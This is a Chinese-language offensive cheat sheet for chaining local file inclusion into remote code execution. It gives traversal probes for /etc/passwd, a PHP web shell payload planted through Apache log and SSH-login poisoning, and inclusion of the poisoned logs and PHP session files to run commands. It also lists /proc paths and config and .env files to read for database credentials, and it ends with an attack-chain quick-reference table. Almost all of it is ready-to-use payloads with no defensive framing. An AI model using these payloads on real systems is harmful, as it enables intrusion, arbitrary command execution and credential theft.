# LFI攻击链

## LFI → 日志投毒 → RCE

### 1. 探测LFI

```
?page=/etc/passwd
?page=....//....//....//etc/passwd
```

### 2. 写入恶意代码到日志

```
# Apache日志
访问: <?php system($_GET['cmd']);?>

# SSH日志
ssh "<?php system('id');?>"@target.com
```

### 3. 包含日志文件RCE

```
?page=/var/log/apache2/access.log&cmd=whoami
?page=/var/log/auth.log&cmd=whoami
```

---

## LFI → Session文件 → RCE

### 1. 找到Session文件

```
/tmp/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
```

### 2. 写入恶意代码

通过登录功能写入Session

### 3. 包含Session

```
?page=/tmp/sess_xxxxx
```

---

## LFI → /proc文件

### 1. 读取环境变量

```
/proc/self/environ
```

### 2. 读取进程命令行

```
/proc/self/cmdline
/proc/$( pidof httpd )/cmdline
```

### 3. 读取fd

```
/proc/self/fd/xxx
```

---

## LFI → 读取配置

### 1. 常见配置路径

```
/var/www/html/config.php
/var/www/html/.env
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
```

### 2. 获取数据库凭证

```
?page=/var/www/html/config.php
```

---

## 攻击链速查

| 阶段 | 方法 | 说明 |
|------|------|------|
| 探测 | ?page=/etc/passwd | 确认LFI |
| 写马 | 日志投毒/Session | 写入代码 |
| RCE | 包含日志/Session | 执行代码 |
| 配置 | 读取config.php | 获取更多凭证 |
